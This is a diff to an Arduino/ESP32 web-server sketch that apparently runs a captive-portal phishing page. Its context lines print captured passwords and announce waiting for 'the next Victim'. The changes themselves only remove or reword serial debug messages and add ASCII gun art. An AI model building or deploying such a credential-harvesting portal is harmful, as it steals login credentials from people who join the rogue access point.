@@ -48,13 +48,11 @@ void setupServer() {
   // 2Serve 
   server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
     request->send(LittleFS, "/index.html", "text/html");
-    Serial.println("Client Connected");
   });
 
   // 2 redirection of the initial internet request
   server.onNotFound([](AsyncWebServerRequest *request){
       request->send(LittleFS, "/index.html", "text/html");
-      Serial.println(" Serving... ( -_•)▄︻デ══━一");
   });
 
   // Route to load style.css file
@@ -82,7 +80,7 @@ void setupServer() {
   // Handle unknown requests (default to index.html for captive portal)
   server.onNotFound([](AsyncWebServerRequest *request){
     request->send(LittleFS, "/index.html", "text/html");
-    Serial.println("Serving fallback index.html");
+  
   });
 
   // Receive and process user input (Backend handling)
@@ -142,8 +140,9 @@ void setup(){
       Serial.print("Captured Passwd ");Serial.println(passwd);
       email_received = false;
       passwd_received = false;
-      Serial.println("We'll wait for the next Victim now: ");
-    }
+      Serial.println("Waiting for the next Victim now ( -_•)▄︻デ══━一 ");
+      Serial.println("   -𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭𒉭-");
+  }
 }
 
 void loop(){
